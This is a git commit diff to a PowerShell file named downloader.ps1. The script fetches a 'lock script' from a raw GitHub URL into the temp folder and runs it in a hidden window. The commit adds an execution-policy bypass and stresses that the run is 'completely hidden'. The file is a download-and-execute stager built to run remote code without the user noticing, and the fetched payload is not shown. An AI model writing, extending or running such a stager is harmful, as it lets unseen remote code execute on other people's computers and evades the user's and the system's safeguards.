7f21b80cb3997b68a4a8b1380e3732eb111a9673
Mubasher Chaudhary <follow.with.mubasher@gmail.com>
2026-08-24 04:23:03 -0700

    Update downloader.ps1

--- downloader.ps1
+++ downloader.ps1
@@ -1,9 +1,9 @@
-# Downloads and runs the lock script HIDDEN
+# Downloads and runs the lock script COMPLETELY HIDDEN
 $url = "https://raw.githubusercontent.com/CodewithMubasher/Scripts/main/script.ps1"
 $tempFile = Join-Path $env:TEMP "lock.ps1"
 
 # Download the script
 Invoke-WebRequest -Uri $url -OutFile $tempFile
 
-# Run it completely hidden (NO WINDOW)
-Start-Process powershell.exe -ArgumentList "-File `"$tempFile`"" -WindowStyle Hidden
+# Run it hidden and exit immediately
+Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$tempFile`""
